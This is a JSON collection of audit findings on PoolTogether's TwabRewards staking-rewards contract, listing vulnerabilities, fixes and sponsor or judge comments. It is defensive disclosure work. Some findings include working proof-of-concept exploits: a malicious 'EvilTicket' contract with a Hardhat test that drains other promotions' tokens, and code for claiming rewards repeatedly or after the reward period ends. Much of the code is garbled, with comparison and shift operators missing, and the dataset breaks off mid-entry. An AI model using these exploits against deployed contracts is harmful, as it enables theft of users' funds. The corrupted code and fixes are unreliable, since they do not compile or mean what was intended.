[
    {
        "Code": "",
        "CodeNames": [
            ""
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\nfunction createPromotion(\n    address _ticket,\n    IERC20 _token,\n    uint216 _tokensPerEpoch,\n    uint32 _startTimestamp,\n    uint32 _epochDuration,\n    uint8 _numberOfEpochs\n) external override returns (uint256) {\n    _requireTicket(_ticket);\n\n    uint256 _nextPromotionId = _latestPromotionId + 1;\n    _latestPromotionId = _nextPromotionId;\n\n    _promotions[_nextPromotionId] = Promotion(\n        msg.sender,\n        _ticket,\n        _token,\n        _tokensPerEpoch,\n        _startTimestamp,\n        _epochDuration,\n        _numberOfEpochs\n    );\n\n    _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);\n\n    emit PromotionCreated(_nextPromotionId);\n\n    return _nextPromotionId;\n}\n"
                ],
                "Type": "  createPromotion()  Lack of input validation for  _epochDuration  can potentially freeze promotion creator's funds",
                "Description": "\n<https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L88-L116\n\nsolidity\nfunction createPromotion(\n    address _ticket,\n    IERC20 _token,\n    uint216 _tokensPerEpoch,\n    uint32 _startTimestamp,\n    uint32 _epochDuration,\n    uint8 _numberOfEpochs\n) external override returns (uint256) {\n    _requireTicket(_ticket);\n\n    uint256 _nextPromotionId = _latestPromotionId + 1;\n    _latestPromotionId = _nextPromotionId;\n\n    _promotions[_nextPromotionId] = Promotion(\n        msg.sender,\n        _ticket,\n        _token,\n        _tokensPerEpoch,\n        _startTimestamp,\n        _epochDuration,\n        _numberOfEpochs\n    );\n\n    _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);\n\n    emit PromotionCreated(_nextPromotionId);\n\n    return _nextPromotionId;\n}\n\n\nIn the current implementation of createPromotion(), _epochDuration is allowed to be 0.\n\nHowever, when _epochDuration = 0, it will be impossible for users to claim the rewards, and the promotion creator won't be able to cancel it.\n\n\n1.  Alice called createPromotion() to create a promotion with the following parameters:\n    *   _token: USDC\n    *   _tokensPerEpoch: 10,000\n    *   _epochDuration: 0\n    *   _numberOfEpochs: 10\n2.  100,000 USDC was transferred from Alice to the TwabRewards contract;\n3.  Users tries to claimRewards() but the transaction always revert at _ticket.getAverageTotalSuppliesBetween() - TwabLib.getAverageBalanceBetween() due to div by 0.\n4.  Alice tries to cancelPromotion() to retrieve the funds, but it always reverts at _requirePromotionActive() since the promotion already ended.\n\nAs a result, Alice's 100,000 USDC is frozen in the contract.\n\n",
                "Repair": "\nConsider adding require(_epochDuration  0) in createPromotion().\n\nPierrickGT (PoolTogether) marked as duplicate(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/106#issuecomment-993713041):\n  Duplicate of https://github.com/code-423n4/2021-12-pooltogether-findings/issues/29\n\nLSDan (judge) commented(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/106#issuecomment-1008322347):\n  I do not consider this to be a duplicate of #29 because the warden in #29 does not mention this specific failure case. This is indeed an easy to encounter bug that can be triggered as the result of a user error or a frontend bug. Loss of all funds for the promotion would be the result.\n\n PierrickGT (PoolTogether) confirmed and resolved:\n  Implemented the suggested require: https://github.com/pooltogether/v4-periphery/blob/e0010b689fb170daac77af5f62abba7ca1397524/contracts/TwabRewards.sol#L126\n\n\n\n\n"
            },
            {
                "Name": "H-02",
                "Location": [],
                "Type": " Backdated _startTimestamp can lead to loss of funds",
                "Description": "\n\nThis can lead to loss of funds as there is no recovery function of funds stuck like this\n\n\n1.  User A creates a new promotion using createPromotion function. By mistake he provides 1 year ago value for _startTimestamp with promotion duration as 6 months\n\n2.  Since there is no check to see that _startTimestamp  block.timestamp so this promotion gets created\n\n3.  User cannot claim this promotion if they were not having promotion tokens in the 1 year old promotion period. This means promotion amount remains with contract\n\n4.  Even promotion creator cannot claim back his tokens since promotion end date has already passed so cancelPromotion will fail\n\n5.  As there is no recovery token function in contract so even contract cant transfer this token and the tokens will remain in this contract with no one able to claim those\n\n",
                "Repair": "\nAdd below check in the createPromotion function\nsolidity\nfunction createPromotion(\n    address _ticket,\n    IERC20 _token,\n    uint216 _tokensPerEpoch,\n    uint32 _startTimestamp,\n    uint32 _epochDuration,\n    uint8 _numberOfEpochs\n) external override returns (uint256) {\n    require(_startTimestampblock.timestamp,\"should be after current time\");\n}\n\nPierrickGT (PoolTogether) confirmed and disagreed with severity(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/8#issuecomment-990391447):\n  It would indeed be an unfortunate event and we will implement this require. That being said, funds of the promotion creator would be at risk, because of an error he made, but not funds of a user, so I consider this bug as being of severity 2 (Med Risk) and not 3 (High Risk).\n\nLSDan (judge) commented(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/8#issuecomment-1008326253):\n  Per the Judge Onboarding document provided by Code423n4, this qualifies as a high risk issue. A UI bug or simple mistake could cause complete loss of funds as sponsor acknowledged.\n \n \n 3 \u2014 High (H): vulns have a risk of 3 and are considered \u201cHigh\u201d severity when assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n \n\n\n\n\n"
            },
            {
                "Name": "H-03",
                "Location": [
                    "//solidity\n  require(block.timestamp  _epochEndTimestamp, \"TwabRewards/epoch-not-over\"); \n",
                    "//solidity\n // SPDX-License-Identifier: GPL-3.0\npragma //solidity 0.8.6;\nimport \"hardhat/console.sol\";  \n\ncontract TwabRewards {\n\n    struct Promotion {\n        uint216 tokensPerEpoch;\n        uint32 startTimestamp;\n        uint32 epochDuration;\n        uint8 numberOfEpochs;\n    }\n    mapping(uint256 = Promotion) internal _promotions;\n    uint256 internal _latestPromotionId;\n    mapping(uint256 = mapping(address = uint256)) internal _claimedEpochs;\n    \n    constructor() {\n        uint id=createPromotion(1,uint32(block.timestamp)-10,1,1);\n        claimRewards(id,1);\n        claimRewards(id,2);\n        claimRewards(id,3);\n        claimRewards(id,4);\n        claimRewards(id,5);\n    }\n     \n    function createPromotion(uint216 _tokensPerEpoch,uint32 _startTimestamp,uint32 _epochDuration,uint8 _numberOfEpochs) public  returns (uint256) {\n        uint256 _nextPromotionId = _latestPromotionId + 1;\n        _latestPromotionId = _nextPromotionId;\n        _promotions[_nextPromotionId] = Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);\n        return _nextPromotionId;\n    }\n \n    function claimRewards(\n        uint256 _promotionId,\n        uint256 _epochId\n    ) public  returns (uint256) {\n        Promotion memory _promotion = _getPromotion(_promotionId);\n        address _user=address(0);\n        uint256 _rewardsAmount;\n        uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];\n\n        for (uint256 index = 0; index < 1; index++) {\n            require(\n                !_isClaimedEpoch(_userClaimedEpochs, _epochId),\n                \"TwabRewards/rewards-already-claimed\"\n            );\n            _rewardsAmount += _calculateRewardAmount(_promotion, _epochId);\n            _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);\n        }\n        _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;\n        console.log(\"Claiming for epoch\",_epochId,_rewardsAmount);\n        return _rewardsAmount;\n    }\n\n    function getPromotion(uint256 _promotionId) public view  returns (Promotion memory) {\n        return _getPromotion(_promotionId);\n    }\n  function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory) {\n        return _promotions[_promotionId];\n    }\n    \n    function _isClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (bool)\n    {\n        return (_userClaimedEpochs  _epochId) & uint256(1) == 1;\n    }\n\n function _calculateRewardAmount(        \n        Promotion memory _promotion,\n        uint256 _epochId\n    ) internal view returns (uint256) {\n        uint256 _epochDuration = _promotion.epochDuration;\n        uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);\n        uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;\n        require(block.timestamp  _epochEndTimestamp, \"TwabRewards/epoch-not-over\");\n        return 1;\n    }\n\n function _updateClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (uint256) {\n        return _userClaimedEpochs | (uint256(1) << _epochId);\n    }\n  \n    function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {        \n        return (block.timestamp _promotion.startTimestamp) / _promotion.epochDuration;\n    }\n \n    function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {\n        // _tokensPerEpoch * _numberOfEpochsLeft\n        return\n            _promotion.tokensPerEpoch *\n            (_promotion.numberOfEpochs _getCurrentEpochId(_promotion));\n    }\n \n}\n"
                ],
                "Type": " Continue claiming reqrds after numberOfEpochs are over",
                "Description": "\n\nWhen claiming rewards via claimRewards(), the function _calculateRewardAmount() is called.\nThe function _calculateRewardAmount() has a check to make sure the epoch is over\n\nsolidity\n  require(block.timestamp  _epochEndTimestamp, \"TwabRewards/epoch-not-over\"); \n\n\nHowever neither functions check if the _epochId is within the range of the reward epochs.\nErgo it is possible to continue claiming rewards after the reward period is over.\nThis only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.\n\nThe proof of concept contains a simplified version of the contract, and shows how this can be done.\nWhen run in remix you get the following output, while there is only 1 epoch.\nconsole.log:\n\u2003Claiming for epoch 1 1\n\u2003Claiming for epoch 2 1\n\u2003Claiming for epoch 3 1\n\u2003Claiming for epoch 4 1\n\u2003Claiming for epoch 5 1\n\n\nsolidity\n // SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.6;\nimport \"hardhat/console.sol\";  \n\ncontract TwabRewards {\n\n    struct Promotion {\n        uint216 tokensPerEpoch;\n        uint32 startTimestamp;\n        uint32 epochDuration;\n        uint8 numberOfEpochs;\n    }\n    mapping(uint256 = Promotion) internal _promotions;\n    uint256 internal _latestPromotionId;\n    mapping(uint256 = mapping(address = uint256)) internal _claimedEpochs;\n    \n    constructor() {\n        uint id=createPromotion(1,uint32(block.timestamp)-10,1,1);\n        claimRewards(id,1);\n        claimRewards(id,2);\n        claimRewards(id,3);\n        claimRewards(id,4);\n        claimRewards(id,5);\n    }\n     \n    function createPromotion(uint216 _tokensPerEpoch,uint32 _startTimestamp,uint32 _epochDuration,uint8 _numberOfEpochs) public  returns (uint256) {\n        uint256 _nextPromotionId = _latestPromotionId + 1;\n        _latestPromotionId = _nextPromotionId;\n        _promotions[_nextPromotionId] = Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);\n        return _nextPromotionId;\n    }\n \n    function claimRewards(\n        uint256 _promotionId,\n        uint256 _epochId\n    ) public  returns (uint256) {\n        Promotion memory _promotion = _getPromotion(_promotionId);\n        address _user=address(0);\n        uint256 _rewardsAmount;\n        uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];\n\n        for (uint256 index = 0; index < 1; index++) {\n            require(\n                !_isClaimedEpoch(_userClaimedEpochs, _epochId),\n                \"TwabRewards/rewards-already-claimed\"\n            );\n            _rewardsAmount += _calculateRewardAmount(_promotion, _epochId);\n            _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);\n        }\n        _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;\n        console.log(\"Claiming for epoch\",_epochId,_rewardsAmount);\n        return _rewardsAmount;\n    }\n\n    function getPromotion(uint256 _promotionId) public view  returns (Promotion memory) {\n        return _getPromotion(_promotionId);\n    }\n  function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory) {\n        return _promotions[_promotionId];\n    }\n    \n    function _isClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (bool)\n    {\n        return (_userClaimedEpochs  _epochId) & uint256(1) == 1;\n    }\n\n function _calculateRewardAmount(        \n        Promotion memory _promotion,\n        uint256 _epochId\n    ) internal view returns (uint256) {\n        uint256 _epochDuration = _promotion.epochDuration;\n        uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);\n        uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;\n        require(block.timestamp  _epochEndTimestamp, \"TwabRewards/epoch-not-over\");\n        return 1;\n    }\n\n function _updateClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (uint256) {\n        return _userClaimedEpochs | (uint256(1) << _epochId);\n    }\n  \n    function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {        \n        return (block.timestamp _promotion.startTimestamp) / _promotion.epochDuration;\n    }\n \n    function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {\n        // _tokensPerEpoch * _numberOfEpochsLeft\n        return\n            _promotion.tokensPerEpoch *\n            (_promotion.numberOfEpochs _getCurrentEpochId(_promotion));\n    }\n \n}\n\n\n",
                "Repair": "\nIn the function _calculateRewardAmount() add something like the following in the beginning after the require.\nif ( _epochId = _promotion.numberOfEpochs) return 0;\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/20)\n\n\n"
            },
            {
                "Name": "H-04",
                "Location": [
                    "//solidity\nfunction cancelPromotion(uint256 _promotionId, address _to) ... {\n    ...\n    uint256 _remainingRewards = _getRemainingRewards(_promotion);\n    delete _promotions[_promotionId];\n    \n"
                ],
                "Type": " cancelPromotion is too rigorous",
                "Description": "\n\nWhen you cancel a promotion with cancelPromotion() then the promotion is complete deleted.\nThis means no-one can claim any rewards anymore, because  _promotions[_promotionId] no longer exists.\n\nIt also means all the unclaimed tokens (of the previous epochs) will stay locked in the contract.\n\n\n<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119-L138\n\nsolidity\nfunction cancelPromotion(uint256 _promotionId, address _to) ... {\n    ...\n    uint256 _remainingRewards = _getRemainingRewards(_promotion);\n    delete _promotions[_promotionId];\n    \n\n\n",
                "Repair": "\nIn the function cancelPromotion() lower the numberOfEpochs or set a state variable, to allow user to claim their rewards.\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/23) \n\n\n"
            },
            {
                "Name": "H-05",
                "Location": [
                    "//solidity\n/// @inheritdoc ITicket\nfunction getAverageTotalSuppliesBetween(\n    uint64[] calldata _startTimes,\n    uint64[] calldata _endTimes\n) external view override returns (uint256[] memory) {\n    uint256[] memory _balances = new uint256[(1);\n    _balances[0] = uint256(1);\n    return _balances;\n}\n\n/// @inheritdoc ITicket\nfunction getAverageBalanceBetween(\n    address _user,\n    uint64 _startTime,\n    uint64 _endTime\n) external view override returns (uint256) {\n    return 1337;\n}\n",
                    "js\ndescribe('exploit()', async () = {\n    it('this shouldnt happen', async () = {\n        const promotionIdOne = 1;\n        const promotionIdTwo = 2;\n\n        await expect(createPromotion(ticket.address))\n            .to.emit(twabRewards, 'PromotionCreated')\n            .withArgs(promotionIdOne);\n        \n        let evilTicketFactory = await getContractFactory('EvilTicket');\n        let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);\n        let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;\n        await expect(twabRewards.connect(wallet2).createPromotion(\n            evilTicket.address,\n            rewardToken.address,\n            tokensPerEpoch,\n            createPromotionTimestamp,\n            1,//epochDuration,\n            0,//epochsNumber,\n        )).to.emit(twabRewards, 'PromotionCreated')\n            .withArgs(promotionIdTwo);\n\n        await increaseTime(100);\n        const epochIds = '100'];\n        await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);\n    });\n});\n",
                    "\n1) TwabRewards\n    exploit()\n        this shouldnt happen:\n    Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'\n    at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)\n    at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)\n    at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)\n    at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)\n    at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)\n    at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)\n"
                ],
                "Type": " Malicious tickets can lead to the loss of all tokens",
                "Description": "\n\nIt allows an attacker to retrieve all the tokens of each promotions.\n\n\nAnyone can create a new promotion using createPromotion(). An attacker can create a new malicious promotion with the following parameters:\n\n*   the address of a malicious ticket smart contract\n*   the token address from the targeted promotion(s)\n*   optionally, _numberOfEpochs equal to 0 to create this promotion for free\n\nThe only verification made on the ticket address given by _requireTicket()(https://github.com/pooltogether/v4-periphery/blob/master/contracts/TwabRewards.sol#L230-L244) is that the smart contract must implement the ITicket interface.\n\nThe attacker can then call claimRewards() with its wallet address, the malicious promotion id and a single _epochId for the sake of clarity.\n\n1.  _calculateRewardAmount() is first called to get the reward amount with the following formula (_promotion.tokensPerEpoch * _ticket.getAverageBalanceBetween()) / _ticket.getAverageTotalSuppliesBetween(). The malicious ticket can return an arbitrary  _averageBalance and an _averageTotalSupplies of 1, leading to an arbitrary large reward amount.\n\n2.  _promotion.token.safeTransfer(_user, _rewardsAmount) is called. It transfers the amount of tokens previously computed to the attacker.\n\nThe attacker receives the tokens of other promotions without having spent anything.\n\n\nThe malicious smart contract is a copy/paste of TicketHarness.sol(https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and Ticket.sol(https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol) with the following changes:\nsolidity\n/// @inheritdoc ITicket\nfunction getAverageTotalSuppliesBetween(\n    uint64[] calldata _startTimes,\n    uint64[] calldata _endTimes\n) external view override returns (uint256[] memory) {\n    uint256[] memory _balances = new uint256[(1);\n    _balances[0] = uint256(1);\n    return _balances;\n}\n\n/// @inheritdoc ITicket\nfunction getAverageBalanceBetween(\n    address _user,\n    uint64 _startTime,\n    uint64 _endTime\n) external view override returns (uint256) {\n    return 1337;\n}\n\n\nThe test for HardHat is:\njs\ndescribe('exploit()', async () = {\n    it('this shouldnt happen', async () = {\n        const promotionIdOne = 1;\n        const promotionIdTwo = 2;\n\n        await expect(createPromotion(ticket.address))\n            .to.emit(twabRewards, 'PromotionCreated')\n            .withArgs(promotionIdOne);\n        \n        let evilTicketFactory = await getContractFactory('EvilTicket');\n        let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);\n        let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;\n        await expect(twabRewards.connect(wallet2).createPromotion(\n            evilTicket.address,\n            rewardToken.address,\n            tokensPerEpoch,\n            createPromotionTimestamp,\n            1,//epochDuration,\n            0,//epochsNumber,\n        )).to.emit(twabRewards, 'PromotionCreated')\n            .withArgs(promotionIdTwo);\n\n        await increaseTime(100);\n        const epochIds = '100'];\n        await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);\n    });\n});\n\nIt results in the following error:\n\n1) TwabRewards\n    exploit()\n        this shouldnt happen:\n    Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'\n    at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)\n    at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)\n    at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)\n    at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)\n    at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)\n    at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)\n\n",
                "Repair": "\nMaybe add a whitelist of trusted tickets?\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/1) \n\n\n"
            },
            {
                "Name": "H-06",
                "Location": [
                    "//solidity\n/// @notice Keeps track of claimed rewards per user.\n/// @dev _claimedEpochs[promotionId][user] = claimedEpochs\n/// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.\nmapping(uint256 = mapping(address = uint256)) internal _claimedEpochs;\n",
                    "//solidity\n(_userClaimedEpochs  _epochId) & uint256(1) == 1;\n",
                    "js\nit('should fail to claim rewards if one or more epochs have already been claimed', async () = {\n    const promotionId = 1;\n\n    const wallet2Amount = toWei('750');\n    const wallet3Amount = toWei('250');\n\n    await ticket.mint(wallet2.address, wallet2Amount);\n    await ticket.mint(wallet3.address, wallet3Amount);\n\n    await createPromotion(ticket.address);\n    await increaseTime(epochDuration * 257);\n\n    await expect(\n        twabRewards.claimRewards(wallet2.address, promotionId, '256', '256']),\n    ).to.be.revertedWith('TwabRewards/rewards-already-claimed');\n});\n"
                ],
                "Type": " Rewards can be claimed multiple times",
                "Description": "\n\nAn attacker can claim its reward 256 * epochDuration seconds after the timestamp at which the promotion started. The vulnerability allows him to claim a reward several times to retrieve all the tokens associated to the promotion.\n\n\nclaimRewards() claim rewards for a given promotion and epoch. In order to prevent a user from claiming a reward multiple times, the mapping _claimedEpochs(https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L32) keeps track of claimed rewards per user:\nsolidity\n/// @notice Keeps track of claimed rewards per user.\n/// @dev _claimedEpochs[promotionId][user] = claimedEpochs\n/// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.\nmapping(uint256 = mapping(address = uint256)) internal _claimedEpochs;\n\n(The comment is wrong, epochs are packed into a uint256 which allows 256 epochs to be stored).\n\n_epochIds is an array of uint256. For each _epochId in this array, claimRewards() checks that the reward associated to this _epochId isn't already claimed thanks to\n_isClaimedEpoch(). _isClaimedEpoch()(https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L371) checks that the bit _epochId of _claimedEpochs is unset:\nsolidity\n(_userClaimedEpochs  _epochId) & uint256(1) == 1;\n\nHowever, if _epochId is greater than 255, _isClaimedEpoch() always returns false. It allows an attacker to claim a reward several times.\n\n_calculateRewardAmount()(https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L289) just makes use of _epochId to tell whether the promotion is over.\n\n\nThe following test should result in a reverted transaction, however the transaction succeeds.\njs\nit('should fail to claim rewards if one or more epochs have already been claimed', async () = {\n    const promotionId = 1;\n\n    const wallet2Amount = toWei('750');\n    const wallet3Amount = toWei('250');\n\n    await ticket.mint(wallet2.address, wallet2Amount);\n    await ticket.mint(wallet3.address, wallet3Amount);\n\n    await createPromotion(ticket.address);\n    await increaseTime(epochDuration * 257);\n\n    await expect(\n        twabRewards.claimRewards(wallet2.address, promotionId, '256', '256']),\n    ).to.be.revertedWith('TwabRewards/rewards-already-claimed');\n});\n\n",
                "Repair": "\nA possible fix could be to change the type of _epochId to uint8 in:\n\n*   _calculateRewardAmount()\n*   _updateClaimedEpoch()\n*   _isClaimedEpoch()\n\nand change the type of _epochIds to uint8[] in claimRewards().\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/3)\n\n\n"
            },
            {
                "Name": "H-07",
                "Location": [],
                "Type": " Contract does not work with fee-on transfer tokens",
                "Description": "\n\nThere exist ERC20 tokens that charge a fee for every transfer.\n\nThis kind of token does not work correctly with the TwabRewards contract as the\nrewards calculation for an user is based on promotion.tokensPerEpoch (see line 320(https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L320)).\n\nHowever, the actual amount of tokens the contract holds could be less than\npromotion.tokensPerEpoch * promotion.numberOfEpochs leading to not claimable\nrewards for users claiming later than others.\n\n",
                "Repair": "\nTo disable fee-on transfer tokens for the contract, add the following code in\ncreatePromotion around line 11:\nsolidity\nuint256 oldBalance = _token.balanceOf(address(this));\n_token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);\nuint256 newBalance = _token.balanceOf(address(this));\nrequire(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance);\n\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/30)\n\nLSDan (judge) commented(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/30#issuecomment-1014431846):\n  This issue results in a direct loss of funds and can happen easily.\n \n \n 3 \u2014 High (H): vulns have a risk of 3 and are considered \u201cHigh\u201d severity when assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n \n\n\n\n \n\n"
            },
            {
                "Name": "M-01",
                "Location": [
                    "//solidity\nfunction _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {\n    // _tokensPerEpoch * _numberOfEpochsLeft\n    return\n        _promotion.tokensPerEpoch *\n        (_promotion.numberOfEpochs _getCurrentEpochId(_promotion));\n}\n",
                    "//solidity\nfunction _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {\n    // elapsedTimestamp / epochDurationTimestamp\n    return (block.timestamp _promotion.startTimestamp) / _promotion.epochDuration;\n}\n"
                ],
                "Type": "  cancelPromotion()  Unable to cancel unstarted promotions",
                "Description": "\nFor unstarted promotions, cancelPromotion() will revert at block.timestamp _promotion.startTimestamp in _getCurrentEpochId().\n\nCall stack: cancelPromotion() - _getRemainingRewards() - _getCurrentEpochId().\n\n<https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L331-L336\n\nsolidity\nfunction _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {\n    // _tokensPerEpoch * _numberOfEpochsLeft\n    return\n        _promotion.tokensPerEpoch *\n        (_promotion.numberOfEpochs _getCurrentEpochId(_promotion));\n}\n\n\n<https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L276-L279\n\nsolidity\nfunction _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {\n    // elapsedTimestamp / epochDurationTimestamp\n    return (block.timestamp _promotion.startTimestamp) / _promotion.epochDuration;\n}\n\n\n",
                "Repair": "\nConsider checking if   _promotion.startTimestamp  block.timestamp  and refund _promotion.tokensPerEpoch * _promotion.numberOfEpochs in cancelPromotion().\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/101) \n\n\n"
            },
            {
                "Name": "M-02",
                "Location": [
                    "//solidity\nrequire(!_isClaimedEpoch(_userClaimedEpochs, _epochId), \"TwabRewards/rewards-already-claimed\");\n"
                ],
                "Type": " getRewardsAmount doesn't check epochs haven't been claimed",
                "Description": "\n\nIn ITwabRewards.sol, it is claimed that getRewardsAmount should account for epochs that have already been claimed, and not include these epochs in the total amount (indeed, there is a line that says @dev Will be 0 if user has already claimed rewards for the epoch.)\n\nHowever, no such check is done in the implementation of getRewardsAmount. This means that users will be shown rewardAmounts that are higher than they should be, and users will be confused when they are transferred fewer tokens than they are told they will. This would cause confusion, and people may begin to mistrust the contract since they think they are being transferred fewer tokens than they are owed.\n\n\nSee the implementation of getRewardsAmount here: <https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L209\n\nNotice that there are no checks that the epochs have not already been claimed. Compare this to claimRewards which *does* check for epochs that have already been claimed with the following require statement:\nsolidity\nrequire(!_isClaimedEpoch(_userClaimedEpochs, _epochId), \"TwabRewards/rewards-already-claimed\");\n\n\nA similar check should be added getRewardsAmount so that previously claimed epochs are not included in the sum.\n\n",
                "Repair": "\nAdd a similar check for previously claimed epochs as described above.\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/50) \n\n\n"
            },
            {
                "Name": "M-03",
                "Location": [],
                "Type": " Dust Token Balances Cannot Be Claimed By An  admin  Account",
                "Description": "\n\nUsers who have a small claim on rewards for various promotions, may not feasibly be able to claim these rewards as gas costs could outweigh the sum they receive in return. Hence, it is likely that a dust balance accrues overtime for tokens allocated for various promotions. Additionally, the _calculateRewardAmount calculation may result in truncated results, leading to further accrual of a dust balance. Therefore, it is useful that these funds do not go to waste.\n\n\n<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L162-L191\n\n",
                "Repair": "\nConsider allowing an admin account to skim a promotion's tokens if it has been inactive for a certain length of time. There are several potential implementations, in varying degrees of complexity. However, the solution should attempt to maximise simplicity while minimising the accrual of dust balances.\n\nPierrickGT (PoolTogether) confirmed(https://github.com/code-423n4/2021-12-pooltogether-findings/issues/75) \n\n\n"
            },
            {
                "Name": "M-04",
                "Location": [],
                "Type": " Unsafe uint64 casting may overflow",
                "Description": "\n\nThe _calculateRewardAmount function casts epoch timestamps from uint256 to uint64 and these may overflow. The epochStartTimestamp value is a function of the user-supplied _epochId value, which could be extremely large (up to 2**255 \u2013 1). While Solidity 0.8.x checks for overflows on arithmetic operations, it does not do so for casting \u2013 the OpenZeppelin SafeCast library offers this. The overflow condition could cause _epochStartTimestamp  _epochEndTimestamp, which the Ticket.sol getAverageBalanceBetween may not be expected to handle. The _epochStartTimestamp could overflow to have a value before the actual start of the promotion, also impacting the rewards calculation.\n\n\nThere are 4 uint64 casting operations in the _calculateRewardAmount function of TwabRewards.sol:\n<https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L304-L312\n\n",
